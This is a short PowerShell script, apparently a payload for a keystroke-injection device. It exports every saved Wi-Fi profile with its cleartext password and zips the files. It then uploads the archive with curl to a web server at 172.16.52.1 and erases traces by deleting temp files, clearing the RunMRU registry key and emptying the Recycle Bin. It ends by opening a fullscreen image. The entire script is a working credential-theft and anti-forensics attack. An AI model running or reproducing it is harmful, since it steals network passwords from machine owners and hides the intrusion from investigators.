# Dumps all wifi credentials to seperate .xml files
netsh wlan export profile key=clear folder="$env:TEMP\wifi"

# Creates an archive of all files named wifi.zip in %TEMP%\wifi
Compress-Archive -Path "$env:TEMP\wifi\*" -DestinationPath "$env:TEMP\wifi\wifi.zip" -Force *> $null 2>&1

# Uploads wifi credentials to pager web server
curl.exe -X POST -H "X-Filename: wifi.zip" --data-binary "@$env:TEMP\wifi\wifi.zip" http://172.16.52.1:42/upload

Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue

& reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f

Import-Module Microsoft.PowerShell.Management -ErrorAction SilentlyContinue

if (Get-Command Clear-RecycleBin -ErrorAction SilentlyContinue) {
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
} else {
    Write-Host "Clear-RecycleBin is not available in this script session."
}

Import-Module Microsoft.PowerShell.Management -ErrorAction SilentlyContinue
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

Start-Process "msedge.exe" "--start-fullscreen https://static0.cbrimages.com/wordpress/wp-content/uploads/2023/07/robert-downey-jr-iron-man.jpg?q=50&fit=crop&w=1232&h=693&dpr=1.5"
